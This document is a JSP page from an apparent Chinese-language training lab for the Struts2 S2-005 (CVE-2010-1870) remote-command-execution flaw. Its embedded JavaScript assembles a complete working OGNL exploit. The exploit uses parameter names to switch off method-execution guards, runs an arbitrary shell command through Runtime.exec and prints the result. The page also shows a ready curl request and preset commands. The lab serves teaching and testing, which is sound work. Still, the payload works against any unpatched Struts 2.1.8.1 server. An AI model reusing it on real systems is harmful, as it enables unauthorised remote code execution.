<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-005 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 1040px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .danger-btn { background: #7d271f; color: #fff; }
        .field { display: grid; gap: 8px; margin-top: 14px; }
        .field label { font-weight: 600; }
        .field textarea { min-height: 168px; resize: vertical; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.6 Consolas, monospace; color: #1d2a35; }
        .field input { padding: 12px 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.5 Consolas, monospace; color: #1d2a35; }
        a { color: #155b52; }
        code, pre { font-family: Consolas, monospace; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
        .status { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px; }
        .status-item { background: #f8f1e7; border-radius: 16px; padding: 16px; border: 1px solid #eadcc8; }
        .ok { color: #155b52; font-weight: 600; }
        .warn { color: #7d271f; font-weight: 600; }
        p, li { line-height: 1.75; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-005 演示靶场</h1>
        <p>这个模块用来演示 <code>S2-005 / CVE-2010-1870</code>：攻击者利用参数名 OGNL 绕过，对 <code>#context</code> 与 <code>#_memberAccess</code> 进行修改，最终实现远程命令执行。这里采用更接近公开 PoC 的 canonical payload，并把命令输出直接写回响应页面。</p>
    </div>
    <div class="card">
        <h2>当前状态</h2>
        <div class="status">
            <div class="status-item">
                <div>标记文件</div>
                <s:if test="markerExists">
                    <div class="warn">/tmp/struts2-s2-005-success 已存在</div>
                </s:if>
                <s:else>
                    <div class="ok">尚未观察到标记文件</div>
                </s:else>
            </div>
            <div class="status-item">
                <div>输出文件</div>
                <s:if test="outputExists">
                    <div class="warn">/tmp/struts2-s2-005-output.txt 已存在</div>
                </s:if>
                <s:else>
                    <div class="ok">尚未观察到输出文件</div>
                </s:else>
            </div>
        </div>
        <pre><s:property value="outputContent"/></pre>
    </div>
    <div class="card">
        <h2>快捷测试</h2>
        <p>这里直接生成 canonical 风格 payload。推荐先试 <code>touch /tmp/struts2-s2-005-success</code>，再试 <code>id</code>、<code>whoami</code>、<code>uname -a</code> 这类在精简镜像里也更常见的命令。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="runPreset('touch /tmp/struts2-s2-005-success')">touch 标记</button>
            <button type="button" class="preset-btn" onclick="runPreset('id')">执行 id</button>
            <button type="button" class="preset-btn" onclick="runPreset('whoami')">执行 whoami</button>
            <button type="button" class="preset-btn" onclick="runPreset('uname -a')">执行 uname -a</button>
            <button type="button" class="preset-btn" onclick="runPreset('pwd')">执行 pwd</button>
            <button type="button" class="submit-btn" onclick="runCustom()">执行当前命令</button>
            <button type="button" class="submit-btn danger-btn" onclick="location.href='reset.action'">清理输出</button>
        </div>
        <div class="field">
            <label for="commandBox">当前命令</label>
            <input id="commandBox" value="touch /tmp/struts2-s2-005-success"/>
        </div>
        <div class="field">
            <label for="payloadBox">当前参数名 Payload</label>
            <textarea id="payloadBox" readonly></textarea>
        </div>
        <pre id="curlPreview"></pre>
    </div>
    <div class="card">
        <h2>说明</h2>
        <ol>
            <li>先通过参数名关闭 <code>denyMethodExecution</code>，再打开 <code>allowStaticMethodAccess</code> 和清空 <code>excludeProperties</code>。</li>
            <li>随后把命令赋给 <code>#mycmd</code>，执行 <code>@java.lang.Runtime@getRuntime().exec(#mycmd)</code>。</li>
            <li>最后通过 <code>DataInputStream</code> 和 <code>ServletActionContext@getResponse()</code> 把命令输出以 <code>UTF-8</code> 文本直接写回响应。</li>
            <li>这个靶场采用 <code>Struts 2.1.8.1</code>，用于体现 S2-003 修复被继续绕过后的 S2-005 形态。</li>
        </ol>
    </div>
</div>
<script>
    const commandStorageKey = 'struts2-s2-005-last-command';

    function strictEncode(value) {
        return encodeURIComponent(value).replace(/[!'()*]/g, function(char) {
            return '%' + char.charCodeAt(0).toString(16).toUpperCase();
        });
    }

    function commandBox() {
        return document.getElementById('commandBox');
    }

    function saveCommand(command) {
        try {
            window.localStorage.setItem(commandStorageKey, command);
        } catch (error) {
        }
    }

    function loadSavedCommand() {
        try {
            return window.localStorage.getItem(commandStorageKey);
        } catch (error) {
            return null;
        }
    }

    function buildRequest(command) {
        const escaped = command.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
        const first = "('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)";
        const second = "('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(bla)(bla)";
        const third = "('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)";
        const fourth = "('\\u0023mycmd\\u003d\\'" + escaped + "\\'')(bla)(bla)";
        const fifth = "('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)";
        const sixth = "(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))";
        const seventh = "(B)(('\\u0023myres\\u003dnew\\40byte[2048]')(bla))";
        const eighth = "(C)(('\\u0023len\\u003d\\u0023mydat.read(\\u0023myres)')(bla))";
        const ninth = "(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres,0,\\u0023len)')(bla))";
        const tenth = "('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)";
        const eleventh = "(E)(('\\u0023myout.setCharacterEncoding(\\'UTF-8\\')')(bla))";
        const twelfth = "(F)(('\\u0023myout.setContentType(\\'text/plain;charset=UTF-8\\')')(bla))";
        const thirteenth = "(G)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla))";
        return [
            strictEncode(first),
            strictEncode(second),
            strictEncode(third),
            strictEncode(fourth),
            strictEncode(fifth),
            strictEncode(sixth),
            strictEncode(seventh),
            strictEncode(eighth),
            strictEncode(ninth),
            strictEncode(tenth),
            strictEncode(eleventh),
            strictEncode(twelfth),
            strictEncode(thirteenth)
        ].join('&');
    }

    function refreshPreview(command) {
        const query = buildRequest(command);
        document.getElementById('payloadBox').value = query;
        document.getElementById('curlPreview').textContent = 'curl -i "http://宿主机IP:9963/index.action?' + query + '"';
        return query;
    }

    function runPreset(command) {
        commandBox().value = command;
        saveCommand(command);
        location.href = 'index.action?' + refreshPreview(command);
    }

    function runCustom() {
        const command = commandBox().value;
        saveCommand(command);
        location.href = 'index.action?' + refreshPreview(command);
    }

    const initialCommand = loadSavedCommand() || commandBox().value;
    commandBox().value = initialCommand;
    refreshPreview(initialCommand);
</script>
</body>
</html>
